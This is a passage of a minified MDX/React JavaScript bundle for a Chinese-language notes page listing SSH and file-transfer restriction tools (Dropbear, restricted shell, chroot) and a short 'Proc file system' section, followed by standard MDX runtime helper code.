(\u9e92\u6dde)\n\u9650\u5236\u6b0a\u9650(\u53ea\u63d0\u4f9bscp/sftp\uff0c\u53ef\u4ee5\u8a2d\u5b9a\u767b\u5165\u7684\u76ee\u9304)\u7684\u50b3\u6a94\u5de5\u5177"),Object(c.b)("li",{parentName:"ol"},"Dropbear(\u5468\u6c9b\u7fa4/\u738b\u6587\u748b)\n\u5c0f\u578bssh\uff0c\u652f\u63f4\u5305\u542bUNIX\u7b49\u8a31\u591a\u4f5c\u696d\u7cfb\u7d71\uff0c\u53ef\u4ee5\u62ff\u4f86\u958b\u767c\u884c\u52d5\u61c9\u7528\uff0c\u65b9\u4fbf\u8de8\u5e73\u53f0\u4f7f\u7528\u3002"),Object(c.b)("li",{parentName:"ol"},"Restrict shell (\u674e\u6069\u8ce2)"),Object(c.b)("li",{parentName:"ol"},"chroot \u505a\u9650\u5236 \uff08\u9756\u9a30\u6f64\u5b89\uff09\xb7",Object(c.b)("a",Object(a.a)({parentName:"li"},{href:"https://ez3c.tw/1820"}),"\u7c21\u6613\u8a2d\u5b9a")," ",Object(c.b)("a",Object(a.a)({parentName:"li"},{href:"https://linux.cn/article-8313-1.html"}),"chroot\u8a2d\u5b9a")),Object(c.b)("li",{parentName:"ol"},"cacti \u4e00\u500d\u3001\u4fca\u752b")),Object(c.b)("h1",{id:"proc-file-system-by-\u9060\u6b63"},"Proc file system by ",Object(c.b)("a",Object(a.a)({parentName:"h1"},{href:"https://www.facebook.com/profile.php?id=100002583104520"}),"\u9060\u6b63")),Object(c.b)("p",null,"\u6bcf\u6b21\u5674\u7684\u6771\u897f\u90fd\u662f\u4e00\u500bpage ~_~"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$lsmod")),Object(c.b)("p",null,Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"http://www.wowotech.net/device_model/kobject.html"}),"kobject")))}o.isMDXComponent=!0},233:function(e,t,n){"use strict";n.d(t,"a",(function(){return m})),n.d(t,"b",(function(){return O}));var a=n(0),b=n.n(a);function c(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){c(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,a,b=function(e,t){if(null==e)return{};var n,a,b={},c=Object.keys(e);for(a=0;a<c.length;a++)n=c[a],t.indexOf(n)>=0||(b[n]=e[n]);return b}(e,t);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(a=0;a<c.length;a++)n=c[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(b[n]=e[n])}return b}var p=b.a.createContext({}),o=function(e){var t=b.a.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):i({},t,{},e)),n},m=function(e){var t=o(e.components);return b.a.createElement(p.Provider,{value:t},e.children)},s={inlineCode:"code",wrapper:function(e){var t=e.children;return b.a.createElement(b.a.Fragment,{},t)}},u=Object(a.forwardRef)((function(e,t){var n=e.components,a=e.mdxType,c=e.originalType,l=e.parentName,p=r(e,["components","mdxType","originalType","parentName"]),m=o(n),u=a,O=m["".concat(l,".").concat(u)]||m[u]||s[u]||c;return n?b.a.createElement(O,i({ref:t},p,{components:n})):b.a.createElement(O,i({ref:t},p))}));function O(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var c=n.length,l=new Array(c);l[0]=u;var i={};for(var r in t)hasOwnProperty.call(t,r)&&(i[r]=t[r]);i.originalType=e,i.mdxType="string"==typeof e?e:a,l[1]=i;for(var p=2;p<c;p++)l[p]=n[p];return b.a.createElement.apply(null,l)}return b.a.createElement.apply(null,n)}u.displayName="MDXCreateElement"}}]);